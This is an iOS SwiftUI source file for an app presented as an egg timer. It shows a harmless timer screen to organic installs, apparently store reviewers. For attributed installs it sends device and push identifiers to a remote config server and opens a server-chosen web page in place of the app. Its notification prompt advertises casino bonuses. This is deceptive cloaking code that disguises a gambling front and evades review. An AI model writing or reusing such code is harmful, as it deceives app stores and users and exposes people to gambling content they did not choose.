import SwiftUI
import UserNotifications
import Firebase
import FirebaseMessaging
import AppsFlyerLib
import Combine
import Network

class LaunchViewController: ObservableObject {
    
    @Published var activeView: ViewType = .loading
    @Published var browserURL: URL?
    @Published var displayPushView = false
    
    private var attributionData: [AnyHashable: Any] = [:]
    private var firstRun: Bool {
        !UserDefaults.standard.bool(forKey: "hasLaunched")
    }
    
    enum ViewType {
        case loading
        case browser
        case funtik
        case noConnection
    }
    
    init() {
        // Register for notifications
        NotificationCenter.default.addObserver(self, selector: #selector(processAttribution(_:)), name: NSNotification.Name("ConversionDataReceived"), object: nil)
        NotificationCenter.default.addObserver(self, selector: #selector(processAttributionError(_:)), name: NSNotification.Name("ConversionDataFailed"), object: nil)
        NotificationCenter.default.addObserver(self, selector: #selector(processTokenUpdate(_:)), name: NSNotification.Name("FCMTokenUpdated"), object: nil)
        NotificationCenter.default.addObserver(self, selector: #selector(reattemptConfig), name: NSNotification.Name("RetryConfig"), object: nil)
        
        // Begin flow
        verifyNetworkAndContinue()
    }
    
    deinit {
        NotificationCenter.default.removeObserver(self)
    }
    
    private func verifyNetworkAndContinue() {
        let networkChecker = NWPathMonitor()
        networkChecker.pathUpdateHandler = { path in
            DispatchQueue.main.async {
                if path.status != .satisfied {
                    self.processNoConnection()
                }
            }
        }
        networkChecker.start(queue: DispatchQueue.global())
    }
    
    @objc private func processAttribution(_ note: Notification) {
        attributionData = (note.userInfo ?? [:])["conversionData"] as? [AnyHashable: Any] ?? [:]
        handleAttributionData()
    }
    
    @objc private func processAttributionError(_ note: Notification) {
        processConfigFailure()
    }
    
    @objc private func processTokenUpdate(_ note: Notification) {
        if let newToken = note.object as? String {
            UserDefaults.standard.set(newToken, forKey: "fcm_token")
        }
    }
    
    @objc private func handlePushLink(_ note: Notification) {
        guard let info = note.userInfo as? [String: Any],
              let temporaryLink = info["tempUrl"] as? String else {
            return
        }
        
        DispatchQueue.main.async {
            self.browserURL = URL(string: temporaryLink)!
            self.activeView = .browser
        }
    }
    
    @objc private func reattemptConfig() {
        verifyNetworkAndContinue()
    }
    
    private func handleAttributionData() {
        guard !attributionData.isEmpty else { return }
        
        if UserDefaults.standard.string(forKey: "app_mode") == "Funtik" {
            DispatchQueue.main.async {
                self.activeView = .funtik
            }
            return
        }
        
        if firstRun {
            if let status = attributionData["af_status"] as? String, status == "Organic" {
                self.switchToFuntikMode()
                return
            }
        }
        
        if let temporaryLink = UserDefaults.standard.string(forKey: "temp_url"), !temporaryLink.isEmpty {
            browserURL = URL(string: temporaryLink)
            self.activeView = .browser
            return
        }
        
        if browserURL == nil {
            if !UserDefaults.standard.bool(forKey: "accepted_notifications") && !UserDefaults.standard.bool(forKey: "system_close_notifications") {
                verifyAndDisplayPushView()
            } else {
                fetchConfigData()
            }
        }
    }
    
    func fetchConfigData() {
        guard let endpoint = URL(string: "https://eggtimerpluspro.com/config.php") else {
            processConfigFailure()
            return
        }
        
        var req = URLRequest(url: endpoint)
        req.httpMethod = "POST"
        req.setValue("application/json", forHTTPHeaderField: "Content-Type")
        
        var payload = attributionData
        payload["af_id"] = AppsFlyerLib.shared().getAppsFlyerUID()
        payload["bundle_id"] = Bundle.main.bundleIdentifier ?? "com.example.app"
        payload["os"] = "iOS"
        payload["store_id"] = "id6753346849"
        payload["locale"] = Locale.preferredLanguages.first?.prefix(2).uppercased() ?? "EN"
        payload["push_token"] = UserDefaults.standard.string(forKey: "fcm_token") ?? Messaging.messaging().fcmToken
        payload["firebase_project_id"] = FirebaseApp.app()?.options.gcmSenderID
        
        do {
            req.httpBody = try JSONSerialization.data(withJSONObject: payload)
        } catch {
            processConfigFailure()
            return
        }
        
        URLSession.shared.dataTask(with: req) { data, resp, err in
            DispatchQueue.main.async {
                if let _ = err {
                    self.processConfigFailure()
                    return
                }
                
                guard let httpResp = resp as? HTTPURLResponse, httpResp.statusCode == 200,
                      let data = data else {
                    self.processConfigFailure()
                    return
                }
                
                do {
                    if let responseJson = try JSONSerialization.jsonObject(with: data) as? [String: Any] {
                        if let success = responseJson["ok"] as? Bool, success {
                            if let urlStr = responseJson["url"] as? String, let expiry = responseJson["expires"] as? TimeInterval {
                                UserDefaults.standard.set(urlStr, forKey: "saved_url")
                                UserDefaults.standard.set(expiry, forKey: "saved_expires")
                                UserDefaults.standard.set("WebView", forKey: "app_mode")
                                UserDefaults.standard.set(true, forKey: "hasLaunched")
                                self.browserURL = URL(string: urlStr)
                                self.activeView = .browser
                                
                                if self.firstRun {
                                    self.verifyAndDisplayPushView()
                                }
                            }
                        } else {
                            self.switchToFuntikMode()
                        }
                    }
                } catch {
                    self.processConfigFailure()
                }
            }
        }.resume()
    }
    
    private func processConfigFailure() {
        if let storedURL = UserDefaults.standard.string(forKey: "saved_url"), let url = URL(string: storedURL) {
            browserURL = url
            activeView = .browser
        } else {
            switchToFuntikMode()
        }
    }
    
    private func switchToFuntikMode() {
        UserDefaults.standard.set("Funtik", forKey: "app_mode")
        UserDefaults.standard.set(true, forKey: "hasLaunched")
        DispatchQueue.main.async {
            self.activeView = .funtik
        }
    }
    
    private func processNoConnection() {
        let currentMode = UserDefaults.standard.string(forKey: "app_mode")
        if currentMode == "WebView" {
            DispatchQueue.main.async {
                self.activeView = .noConnection
            }
        } else {
            switchToFuntikMode()
        }
    }

    private func verifyAndDisplayPushView() {
        if let previousPrompt = UserDefaults.standard.value(forKey: "last_notification_ask") as? Date,
           Date().timeIntervalSince(previousPrompt) < 259200 {
            fetchConfigData()
            return
        }
        displayPushView = true
    }
    
    func askForPushPermission() {
        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .sound, .badge]) { allowed, err in
            DispatchQueue.main.async {
                if allowed {
                    UserDefaults.standard.set(true, forKey: "accepted_notifications")
                    UIApplication.shared.registerForRemoteNotifications()
                } else {
                    UserDefaults.standard.set(false, forKey: "accepted_notifications")
                    UserDefaults.standard.set(true, forKey: "system_close_notifications")
                }
                self.fetchConfigData()
                self.displayPushView = false
            }
        }
    }
}

struct EggTImerSplashView: View {
    
    @StateObject private var controller = LaunchViewController()
    
    @State var showAlert = false
    @State var alertText = ""
    
    var body: some View {
        ZStack {
            if controller.activeView == .loading || controller.displayPushView {
                launchScreen
            }
            
            if controller.displayPushView {
                NotificationPermissionView(
                    onYes: {
                        controller.askForPushPermission()
                    },
                    onSkip: {
                        UserDefaults.standard.set(Date(), forKey: "last_notification_ask")
                        controller.displayPushView = false
                        controller.fetchConfigData()
                    }
                )
            } else {
                switch controller.activeView {
                case .loading:
                    EmptyView()
                case .browser:
                    if let url = controller.browserURL {
                        InterfaceContainer()
                    } else {
                        ContentView()
                    }
                case .funtik:
                    ContentView()
                case .noConnection:
                    NoInternetView {
                        NotificationCenter.default.post(name: NSNotification.Name("RetryConfig"), object: nil)
                    }
                }
            }
        }
        .onReceive(NotificationCenter.default.publisher(for: Notification.Name("show_alert"))) { note in
            let info = (note.userInfo as? [String: Any])?["data"] as? String
            showAlert = true
            alertText = "data: \(info)"
        }
        .alert(isPresented: $showAlert) {
            Alert(title: Text("Alert"), message: Text(alertText))
        }
    }

    @State private var progress: Double = 0.0
    
    private var launchScreen: some View {
        GeometryReader { geometry in
            let isLandscape = geometry.size.width > geometry.size.height
            
            ZStack {
                if isLandscape {
                    Image("splash_bg_land")
                        .resizable()
                        .scaledToFill()
                        .frame(width: geometry.size.width, height: geometry.size.height)
                        .ignoresSafeArea()
                } else {
                    Image("splash_bg")
                        .resizable()
                        .scaledToFill()
                        .frame(width: geometry.size.width, height: geometry.size.height)
                        .ignoresSafeArea()
                }
                
                VStack {
                    Spacer()
                    
                    Text("Loading content...")
                        .font(.custom("Inter-Regular_Black", size: 24))
                        .foregroundColor(.white)
                    
                    ProgressView(value: progress)
                        .progressViewStyle(.linear)
                        .padding(.horizontal, 42)
                    
                    
                    Spacer()
                        .frame(height: isLandscape ? 30 : 100)
                }
            }
            .onAppear {
                for i in 1..<10 {
                    DispatchQueue.main.asyncAfter(deadline: .now() + (1 * Double(i))) {
                        withAnimation(.easeIn(duration: 1.0)) {
                            progress = Double(i) / 10.0
                        }
                    }
                }
            }
            
        }
        .ignoresSafeArea()
    }
    
}

struct NotificationPermissionView: View {
    var onYes: () -> Void
    var onSkip: () -> Void
    
    var body: some View {
        GeometryReader { geometry in
            let isLandscape = geometry.size.width > geometry.size.height
            
            ZStack {
                if isLandscape {
                    Image("splash_bg_land")
                        .resizable()
                        .scaledToFill()
                        .frame(width: geometry.size.width, height: geometry.size.height)
                        .ignoresSafeArea()
                } else {
                    Image("splash_bg")
                        .resizable()
                        .scaledToFill()
                        .frame(width: geometry.size.width, height: geometry.size.height)
                        .ignoresSafeArea()
                }
                
                VStack(spacing: isLandscape ? 5 : 10) {
                    Spacer()
                    
                    Text("Allow notifications about bonuses and promos".uppercased())
                        .font(.custom("Inter-Regular_Bold", size: 20))
                        .foregroundColor(.white)
                        .multilineTextAlignment(.center)
                        .padding(.horizontal, 32)
                    
                    Text("Stay tuned with best offers from our casino")
                        .font(.custom("Inter-Regular_Medium", size: 16))
                        .foregroundColor(Color.init(red: 186/255, green: 186/255, blue: 186/255))
                        .multilineTextAlignment(.center)
                        .padding(.horizontal, 52)
                    
                    Button(action: onYes) {
                        ZStack {
                            RoundedRectangle(cornerRadius: 16, style: .continuous)
                                .fill(Color.init(red: 61/255, green: 197/255, blue: 91/255))
                            
                            Text("Yes, I Want Bonuses!")
                                .font(.custom("Inter-Regular_Regular", size: 16))
                                .foregroundColor(.white)
                        }
                    }
                    .frame(height: 50)
                    .padding(.horizontal, 32)
                    .padding(.top, 24)
                    
                    Button(action: onSkip) {
                        Text("Skip")
                            .font(.custom("Inter-Regular_Medium", size: 16))
                            .foregroundColor(Color.init(red: 186/255, green: 186/255, blue: 186/255))
                            .multilineTextAlignment(.center)
                    }
                    
                    Spacer()
                        .frame(height: isLandscape ? 50 : 70)
                }
                .padding(.horizontal, isLandscape ? 20 : 0)
            }
            
        }
        .ignoresSafeArea()
    }
}

struct NoInternetView: View {
    var retryAction: () -> Void
    
    var body: some View {
        GeometryReader { geometry in
            let isLandscape = geometry.size.width > geometry.size.height
            
            ZStack {
                if isLandscape {
                    Image("splash_bg_land")
                        .resizable()
                        .scaledToFill()
                        .frame(width: geometry.size.width, height: geometry.size.height)
                        .ignoresSafeArea()
                } else {
                    Image("splash_bg")
                        .resizable()
                        .scaledToFill()
                        .frame(width: geometry.size.width, height: geometry.size.height)
                        .ignoresSafeArea()
                }
                
                VStack(spacing: isLandscape ? 5 : 10) {
                    Spacer()
                    
                    Text("No internet connection!".uppercased())
                        .font(.custom("Inter-Regular_Bold", size: 20))
                        .foregroundColor(.white)
                        .multilineTextAlignment(.center)
                        .padding(.horizontal, 32)
                    
                    Button(action: retryAction) {
                        ZStack {
                            RoundedRectangle(cornerRadius: 16, style: .continuous)
                                .fill(Color.init(red: 61/255, green: 197/255, blue: 91/255))
                            
                            Text("Retry")
                                .font(.custom("Inter-Regular_Regular", size: 16))
                                .foregroundColor(.white)
                        }
                    }
                    .frame(height: 50)
                    .padding(.horizontal, 32)
                    .padding(.top, 24)
                    
                    Spacer()
                        .frame(height: isLandscape ? 50 : 70)
                }
                .padding(.horizontal, isLandscape ? 20 : 0)
            }
            
        }
        .ignoresSafeArea()
    }
    
}

#Preview {
    EggTImerSplashView()
}
